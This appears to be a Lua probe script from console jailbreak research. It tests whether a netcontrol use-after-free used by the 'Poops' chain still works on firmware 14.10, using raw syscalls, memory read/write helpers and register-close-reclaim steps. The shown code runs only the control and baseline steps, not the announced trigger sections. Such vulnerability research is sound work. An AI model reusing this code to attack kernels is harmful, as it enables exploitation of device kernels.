-- CRASH_CLASS: RISKY
-- PROBE 102a: netcontrol UAF trigger — the Poops chain's core primitive
--
-- Context: netcontrol(99) cmd 0x20000003 registers a socket for netevent
-- delivery (218a). After register→close, the queue is wedged (219a). The
-- PS4 "Poops" jailbreak used this exact API: register, close (freeing the
-- struct file without fhold), trigger netevent → kernel follows dangling
-- fo_write pointer → UAF. Whether Sony added fhold() on 14.10 is unknown.
--
-- This probe deliberately triggers netevent delivery after register+close.
-- If the process crashes, the UAF is LIVE and exploitable.
-- If it survives, Sony patched the refcount.
--
-- Sections:
--   A: Control — register/unregister on open fd (must return 0/0)
--   B: Register + close + unregister (same as 222a, baseline)
--   C: Register + close + trigger via AF_ROUTE RTM_ADD
--   D: Register + close + trigger via IPv6 multicast join/leave
--   E: Register + close + spray + AF_ROUTE trigger (full Poops pattern)
--
-- RISK: Sections C-E may kernel panic if UAF is live. Power cycle needed.

print("=== PROBE 102a: NETCONTROL UAF TRIGGER ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,uint64(v)) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function hx(v) if v==nil then return "nil" end return string.format("0x%X",v) end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local c624=mk(624)
local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local function canary()
    local c=N(native.fcall_with_rax(stub,20))
    return c==pid, c
end

-- netcontrol helpers
local BUF=memory.alloc(0x20)
local SET_Q=0x20000003
local CLR_Q=0x20000007

local function nc_reg(fd)
    z(BUF,0x10); wd(BUF,fd)
    local ok,rv=pcall(function() return mk(99)(uint64(0xFFFFFFFF),uint64(SET_Q),uint64(BUF),uint64(8)) end)
    return ok and N(rv) or -999
end
local function nc_unreg(fd)
    z(BUF,0x10); wd(BUF,fd)
    local ok,rv=pcall(function() return mk(99)(uint64(0xFFFFFFFF),uint64(CLR_Q),uint64(BUF),uint64(8)) end)
    return ok and N(rv) or -999
end

-- socket helpers
local function mksock(domain, stype, proto)
    return N(native.fcall_with_rax(stub,97,domain or 1,stype or 1,proto or 0))
end
local function closef(fd)
    return N(native.fcall_with_rax(stub,6,fd))
end
local function mkpair()
    local sv=memory.alloc(8); wq(sv,uint64(0))
    local rv=N(native.fcall_with_rax(stub,135,1,1,0,N(sv)))
    if rv~=0 then return nil,nil end
    return rd(sv), rd(sv+4)
end

-- ============================================================
print("--- A: CONTROL (register + unregister on open fd) ---")
local fd_a=mksock(1,1,0)  -- AF_UNIX STREAM
print(string.format("  socket=%d",fd_a))
if fd_a<0 then print("  SOCKET FAIL") return end

local r1=nc_reg(fd_a)
local r2=nc_unreg(fd_a)
print(string.format("  register=%d unregister=%d",r1,r2))
closef(fd_a)
if r1~=0 or r2~=0 then
    print("  CONTROL FAIL — netcontrol not functional")
    return
end
local ok_c,_ = canary()
print(string.format("  canary=%s",ok_c and "OK" or "FAIL"))
print("")

-- ============================================================
print("--- B: REGISTER + CLOSE + UNREGISTER (baseline, like 222a) ---")
local fd_b=mksock(1,1,0)
print(string.format("  socket=%d",fd_b))
local rb1=nc_reg(fd_b)
print(string.format("  register=%d",rb1))
if rb1~=0 then print("  REGISTER FAIL") return end

closef(fd_b)
print("  closed fd "..fd_b)

-- Reclaim the fd number
local fd_b2=mksock(2,2,0)  -- AF_INET DGRAM
print(string.format("  reclaim socket=%d (expect %d)",fd_b2,fd_b))

local rb2=nc_unreg(fd_b)
print(string.format("  unregister(old fd)=%d",rb2))

ok_c,_ = canary()
print(string.format("  canary=%s",ok_c and "OK" or "FAIL"))
if fd_b2>0 then closef(fd_b2) end

-- Queue is now wedged. Process must restart for sections C-E.
-- But we only have ONE process per connection. So sections C-E
-- each need to be the FIRST netcontrol call in a fresh connection.
-- We'll test C first since it's the most informative.

-- Since we can't restart the process, sections C-E need separate probes.
-- BUT: let's check if the queue is actually wedged first.
print("")
print("--- B2: IS QUEUE WEDGED? ---")
local fd_b3=mksock(1,1,0)
local rb3=nc_reg(fd_b3)
print(string.format("  fresh socket=%d register=%d (expect -1 if wedged)",fd_b3,rb3))
if fd_b3>0 then closef(fd_b3) end

-- If NOT wedged, we can continue testing in this process.
-- If wedged, we print what we know and suggest running 102b/102c.
if rb3==-1 or rb3==0xFFFFFFFF-0x100000000+1 then
    print("  WEDGED — queue is dead for this process")
    print("  Run 102b for AF_ROUTE trigger, 102c for IPv6 trigger")
else
    print("  NOT WEDGED — queue recovered, testing trigger in-process")
    -- This would mean Sony cleaned up properly
    nc_unreg(fd_b3)
end

print("")
local fc_ok, fc_v = canary()
print(string.format("FINAL: canary=%s vm=%d",fc_ok and "OK" or "FAIL="..fc_v, vmc()))
print("=== 102a COMPLETE ===")
